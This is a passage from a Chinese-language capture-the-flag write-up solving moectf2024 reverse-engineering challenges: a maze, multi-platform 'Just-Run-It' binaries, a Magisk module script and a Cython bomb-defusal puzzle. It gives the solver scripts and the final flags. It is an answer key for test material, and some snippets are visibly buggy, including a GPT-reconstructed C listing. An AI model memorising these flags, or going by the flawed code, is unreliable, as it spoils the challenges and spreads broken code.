class="number">10</span> + (x - <span class="number">1</span>) / <span class="number">8</span>];</span><br><span class="line">maze[<span class="number">10</span> * y - <span class="number">10</span> + (x - <span class="number">1</span>) / <span class="number">8</span>] = (<span class="number">1</span> &lt;&lt; (<span class="number">7</span> - (x - <span class="number">1</span>) % <span class="number">8</span>)) | temp;</span><br><span class="line"><span class="keyword">return</span> ((<span class="type">int</span>)temp &gt;&gt; (<span class="number">7</span> - (x - <span class="number">1</span>) % <span class="number">8</span>)) &amp; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">find_path</span><span class="params">(<span class="type">int</span> begin_x, <span class="type">int</span> begin_y, <span class="type">int</span> end_x, <span class="type">int</span> end_y)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; dirs = &#123;&#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="type">char</span>&gt; dir_chars = &#123;<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;;&lt;/<span class="type">char</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">queue</span>&lt;tuple&lt;<span class="type">int</span>, <span class="type">int</span>, <span class="built_in">string</span>&gt;&gt; q;</span><br><span class="line"><span class="built_in">set</span>&lt;<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; visited;</span><br><span class="line"></span><br><span class="line">q.push(&#123;begin_x, begin_y, <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line">visited.insert(&#123;begin_x, begin_y&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!q.empty()) &#123;</span><br><span class="line">    <span class="keyword">auto</span> [x, y, path] = q.front();</span><br><span class="line">    q.pop();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x == end_x &amp;&amp; y == end_y - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dirs.size(); ++i) &#123;</span><br><span class="line">        <span class="type">int</span> new_x = x + dirs[i].first;</span><br><span class="line">        <span class="type">int</span> new_y = y + dirs[i].second;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_wall(new_x, new_y) &amp;&amp; visited.find(&#123;new_x, new_y&#125;) == visited.end()) &#123;</span><br><span class="line">            visited.insert(&#123;new_x, new_y&#125;);</span><br><span class="line">            q.push(&#123;new_x, new_y, path + dir_chars[i]&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nullptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为那个函数其实就是判断(x,y)是否可通行，返回值也非常简单<br>其二（硬核爆破）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">directions = [<span class="string">&quot;w&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;d&quot;</span>]</span><br><span class="line"></span><br><span class="line">def move(path) -&gt; str:</span><br><span class="line">    result = subprocess.run([<span class="string">&quot;echo&quot;</span>, path, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;ezMaze.exe&quot;</span>], shell=True, capture_output=True, text=True)</span><br><span class="line">    <span class="keyword">return</span> result.<span class="built_in">stdout</span></span><br><span class="line"></span><br><span class="line">def main() -&gt; None:</span><br><span class="line">    <span class="built_in">stack</span> = [(<span class="string">&quot;&quot;</span>, (<span class="number">2</span>, <span class="number">2</span>))]</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    visited.add((<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">stack</span>:</span><br><span class="line">        path, (x, y) = <span class="built_in">stack</span>.pop()</span><br><span class="line">        result = move(path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;YOU WIN!!! the flag is&quot;</span> in result:</span><br><span class="line">            print(path)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You cannot walk the same path!!&quot;</span> in result:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> direction in directions:</span><br><span class="line">            new_path = path + direction</span><br><span class="line">            new_x, new_y = x, y</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> direction == <span class="string">&quot;w&quot;</span>:</span><br><span class="line">                new_y -= <span class="number">1</span></span><br><span class="line">            elif direction == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">                new_x -= <span class="number">1</span></span><br><span class="line">            elif direction == <span class="string">&quot;s&quot;</span>:</span><br><span class="line">                new_y += <span class="number">1</span></span><br><span class="line">            elif direction == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">                new_x += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (new_x, new_y) not in visited:</span><br><span class="line">                visited.add((new_x, new_y))</span><br><span class="line">                <span class="built_in">stack</span>.append((new_path, (new_x, new_y)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其三：<br>先用upx脱壳，本程序由于使用了x方向的状态压缩，把01的迷宫压缩成了一个数组，并且使用位运算进行读取。<br>所以把迷宫抄出来，用notepad++来显示路径，即可写出答案（或者使用bfs进行路径获取）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddsssdsdssddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddsssdddwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaaawwddddddddddddddddwwwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwddddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddssssaaaaaaaaaassdddddddssaaaaaassddddddddddddssaaaaaaaaaaaassdddddddddddsssssaaaaaaaaaaaaaassaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssssaaaaaaaaaaaaaaaassddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaaawwawawwwaaaaaaaaaaaaaawwddddddddddddddwwaaaaaaaaaaaaaawwddddddddddddddwwaaaaaaaaaaaaaaaasssssssssssssssssssssssssddddddddddddddddddddddddddddddddddwddddddddddddddddddwdddwwwdddddddddddddddwwaaaaaaaaaaaaaaawwddddddwwaaaaaaawwddddddddddddddssdddwwwawwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwwwwwwwwwwwwwwwwwwwwdddssssssssssssssssssssssssssssssssssssssssssss</span><br></pre></td></tr></table></figure><p>路径是唯一解，因为不能往回走。（终点可以从程序里面拿到，是右下角最后一个0的位置）<br><code>moectf&#123;the_18446744024826406994_amazing_maze!!&#125;</code></p><h1 id="Just-Run-It"><a href="#Just-Run-It" class="headerlink" title="Just-Run-It"></a>Just-Run-It</h1><p>包含了四个可执行文件，这个题可以载入静态分析，获取flag，也可以仅仅RUN，获得flag<br>0x0 与 0x1均加了upx壳<br>0x0 windows下的x64执行文件，运行后</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">moectf2024@xdsec ~&gt; cat /flag.0</span><br><span class="line">6257396c5933526d657a55355a6d45</span><br></pre></td></tr></table></figure><p>0x1 linux下的x64执行文件，运行后</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">moectf2024@xdsec ~&gt; cat /flag.1</span><br><span class="line">324d444a6a4c5459794e4745744e44</span><br></pre></td></tr></table></figure><p>0x2 Android apk，安装并运行后</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">moectf2024@xdsec ~&gt; cat /flag.2</span><br><span class="line">42694e7930345954566a4c57557a4e</span><br></pre></td></tr></table></figure><p>APK源码</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.edu.xidian.myapplication</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle</span><br><span class="line"><span class="keyword">import</span> androidx.activity.ComponentActivity</span><br><span class="line"><span class="keyword">import</span> androidx.activity.compose.setContent</span><br><span class="line"><span class="keyword">import</span> androidx.compose.foundation.layout.Column</span><br><span class="line"><span class="keyword">import</span> androidx.compose.foundation.layout.fillMaxSize</span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.MaterialTheme</span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.Surface</span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.Text</span><br><span class="line"><span class="keyword">import</span> androidx.compose.runtime.Composable</span><br><span class="line"><span class="keyword">import</span> androidx.compose.runtime.remember</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.Modifier</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.tooling.preview.Preview</span><br><span class="line"><span class="keyword">import</span> cn.edu.xidian.myapplication.ui.theme.MyApplicationTheme</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : <span class="type">ComponentActivity</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        setContent &#123;</span><br><span class="line">            MyApplicationTheme &#123;</span><br><span class="line">                <span class="comment">// A surface container using the &#x27;background&#x27; color from the theme</span></span><br><span class="line">                Surface(</span><br><span class="line">                    color = MaterialTheme.colorScheme.background</span><br><span class="line">                ) &#123;</span><br><span class="line">                    MyScreenContent()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">MyScreenContent</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Column(modifier = Modifier.fillMaxSize()) &#123;</span><br><span class="line">        Greeting(<span class="string">&quot;Android&quot;</span>)</span><br><span class="line">        render()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">Greeting</span><span class="params">(name: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">    Text(text = <span class="string">&quot;Hello moectf2024!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">render</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Column &#123;</span><br><span class="line">        Text(text = <span class="string">&quot;moectf2024@xdsec ~&gt; cat /flag.2&quot;</span>)</span><br><span class="line">        Text(text = <span class="string">&quot;42694e7930345954566a4c57557a4e&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Preview(showBackground = true)</span></span><br><span class="line"><span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">DefaultPreview</span><span class="params">()</span></span> &#123;</span><br><span class="line">    MyApplicationTheme &#123;</span><br><span class="line">        MyScreenContent()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x3 riscv ELF64程序</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Kali Linux 下</span><br><span class="line">sudo apt install qemu-user</span><br><span class="line">chmod +x ./0x3.riscv64.elf</span><br><span class="line">qemu-riscv64 ./0x3.riscv64.elf</span><br><span class="line"># [87, 85, 49, 78, 122, 82, 106, 90, 106, 108, 105, 79, 88, 48, 61]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">87</span>, <span class="number">85</span>, <span class="number">49</span>, <span class="number">78</span>, <span class="number">122</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">106</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">79</span>, <span class="number">88</span>, <span class="number">48</span>, <span class="number">61</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,a))</span><br><span class="line"><span class="comment"># WU1NzRjZjliOX0=</span></span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">6257396c5933526d657a55355a6d45324d444a6a4c5459794e4745744e4442694e7930345954566a4c57557a4e</span><br><span class="line">bW9lY3RmezU5ZmE2MDJjLTYyNGEtNDBiNy04YTVjLWUzN</span><br><span class="line">再加上最后0x3的WU1NzRjZjliOX0=</span><br><span class="line">bW9lY3RmezU5ZmE2MDJjLTYyNGEtNDBiNy04YTVjLWUzNWU1NzRjZjliOX0=</span><br><span class="line">base64 decode</span><br><span class="line"># moectf&#123;59fa602c-624a-40b7-8a5c-e35e574cf9b9&#125;</span><br></pre></td></tr></table></figure><p><code>moectf&#123;59fa602c-624a-40b7-8a5c-e35e574cf9b9&#125;</code></p><h1 id="SecretModule"><a href="#SecretModule" class="headerlink" title="SecretModule"></a>SecretModule</h1><p>Magisk Module<br>Shell Script解密<br>然后是一点点Android知识<br>需要知道 getevent 命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">testk</span></span>() &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Welcome to the Secret module!But before you begin,you need to prove your self.&quot;</span></span><br><span class="line">  (/system/bin/getevent -lc 1 2&gt;&amp;1 | /system/bin/grep VOLUME | /system/bin/grep <span class="string">&quot; DOWN&quot;</span> &gt; <span class="variable">$MODPATH</span>/events) || <span class="built_in">return</span> 1</span><br><span class="line">  <span class="built_in">return</span> 0</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">choose</span></span>() &#123;</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    /system/bin/getevent -lc 1 2&gt;&amp;1 | /system/bin/grep VOLUME | /system/bin/grep <span class="string">&quot; DOWN&quot;</span> &gt; <span class="variable">$MODPATH</span>/events</span><br><span class="line">    <span class="keyword">if</span> (`<span class="built_in">cat</span> <span class="variable">$MODPATH</span>/events 2&gt;/dev/null | /system/bin/grep VOLUME &gt;/dev/null`); <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="keyword">if</span> (`<span class="built_in">cat</span> <span class="variable">$MODPATH</span>/events 2&gt;/dev/null | /system/bin/grep VOLUMEUP &gt;/dev/null`); <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;114514&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;1919810&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> testk; <span class="keyword">then</span></span><br><span class="line">  ui_print <span class="string">&quot;Great! Now enter the secret.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ui_print <span class="string">&quot;Legacy Device. Use a newer device to do this challenge&quot;</span></span><br><span class="line">  <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">concatenated=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 1 2 3 4 5 6 7</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  result=$(choose)</span><br><span class="line">  concatenated=<span class="string">&quot;<span class="variable">$&#123;concatenated&#125;</span><span class="variable">$&#123;result&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">input_str=$(<span class="built_in">echo</span> -n <span class="variable">$concatenated</span> | <span class="built_in">md5sum</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">sec=<span class="string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$input_str</span> = <span class="variable">$sec</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;You are right!Flag is&#x27;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;moectf&#123;<span class="variable">$concatenated</span>&#125;&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;Wrong. Try again.&#x27;</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>里面是一个MD5的选择爆破，用Python或者手动猜都可以。<br><code>114514114514191981011451411451419198101919810</code></p><h1 id="Cython-Strike-Bomb-Defusion"><a href="#Cython-Strike-Bomb-Defusion" class="headerlink" title="Cython-Strike: Bomb Defusion"></a>Cython-Strike: Bomb Defusion</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bomb_defuse <span class="keyword">import</span> Bomb, DefuseKit</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_bombmemory</span>(<span class="params">kit</span>):</span><br><span class="line">    processed_data = []</span><br><span class="line">    <span class="keyword">for</span> address <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0</span>, <span class="number">0x400</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = kit.read_memory(address)</span><br><span class="line">            <span class="keyword">if</span> data != <span class="string">&#x27;0x0&#x27;</span>:</span><br><span class="line">                <span class="comment">#print(data)</span></span><br><span class="line">                processed_data.append(data)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment">#print(e)</span></span><br><span class="line">            processed_data.append(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> processed_data</span><br><span class="line"></span><br><span class="line">bomb = Bomb()</span><br><span class="line">kit = DefuseKit(bomb)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Bomb State: <span class="subst">&#123;bomb.state&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Bomb Mask: <span class="subst">&#123;bomb.mask&#125;</span>&quot;</span>)</span><br><span class="line">memory_data = read_bombmemory(kit)</span><br><span class="line">code = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(data, <span class="number">16</span>)) <span class="keyword">if</span> data != <span class="string">&#x27;*&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> data <span class="keyword">in</span> memory_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"></span><br><span class="line">password = <span class="number">3786171</span>  <span class="comment">#60578736 &gt;&gt; ((7355608 % 5) + 1)</span></span><br><span class="line">flag = bomb.enter_pwd(password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Bomb has been defused! Counter Terrorists Win! Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Your defusekit has successfully connected to the bomb! The wire are tangled, but you&#x27;ve found the bomb&#x27;s inst ram!</span></span><br><span class="line"><span class="comment">#Scanning through the inst ram...</span></span><br><span class="line"><span class="comment">#We&#x27;ve got access to some juicy data. Time to defuse!</span></span><br><span class="line"><span class="comment">#tip: use read_memory method to read data from the inst ram</span></span><br><span class="line"><span class="comment">#Bomb State: planted</span></span><br><span class="line"><span class="comment">#Bomb Mask: 7355608</span></span><br><span class="line"><span class="comment">#de*i*e MAX_*** 0xffffff***unsign*d int ma**;***int p*ant_b**b(unsigned int input)&#123;if *input &lt;= MAX_***) &#123;ma** = input;r**urn 0;&#125; e*se*&#123;***ret**n -1;&#125; &#125;***void expl*de_b*m***oid)*&#123;***void def**e_**mb(v*id)&#123;***&#125;***check_p**d(uns*gned*int in*u*)*&#123;if*(input*&gt; MAX_***)*&#123;***explode_b**b();***&#125;***if*((in**t ^ ma** == 114) &amp;&amp; (input &lt;&lt; (ma** % 5) + 1 == 60578736))*&#123;defuse_b**b();r**urn**&#125;***explode_b**b();***retu**;***&#125;</span></span><br><span class="line"><span class="comment">#Bomb defused! Flag: moectf&#123;CoUnter_TerR0rists_w1n&#125;</span></span><br></pre></td></tr></table></figure><p>找我们的gpt补一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VAL 0xffffff</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">plant_bomb</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input &lt;= MAX_VAL) &#123;</span><br><span class="line">        max = input;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">explode_bomb</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">defuse_bomb</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_pwd</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input &gt; MAX_VAL) &#123;</span><br><span class="line">        explode_bomb();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input ^ mask == <span class="number">114</span> &amp;&amp; ((input &lt;&lt; ((mask % <span class="number">5</span>) + <span class="number">1</span>)) == <span class="number">60578736</span>)) &#123;</span><br><span class="line">        defuse_bomb();</span><br><span class="line">        <span 